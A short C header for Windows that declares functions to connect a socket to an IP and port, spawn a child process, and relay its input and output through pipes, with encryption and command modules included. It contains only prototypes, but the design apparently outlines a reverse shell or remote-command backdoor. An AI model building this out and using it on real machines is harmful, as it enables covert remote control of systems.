#ifndef Socket_functions_header_h    // To make sure you don't declare the function more than once by including the header multiple times.
#define Socket_functions_header_h
#include <Windows.h>

#include "commands.h" 
#include "ciphers_header.h"


//https://stackoverflow.com/questions/15891781/how-to-call-on-a-function-found-on-another-file#15891800

int ConSocket(char* ip, char* port);
void CreatePipes(void);
int CreateChildProcess(void);
DWORD WINAPI FromSocketToPipe(LPVOID lpParameter);
void WriteToPipe(CHAR* chBuf, DWORD dwRead, HANDLE hWritePipe);
DWORD WINAPI FromPipeToSocket(LPVOID lpParameter);
DWORD WINAPI FromPipeCommandsToSocket(LPVOID lpParameter);
void ReadFromPipe(CHAR* chBuf, LPDWORD pdwRead, HANDLE hReadPipe);
void MyWaitForSingleObject(void);

#endif
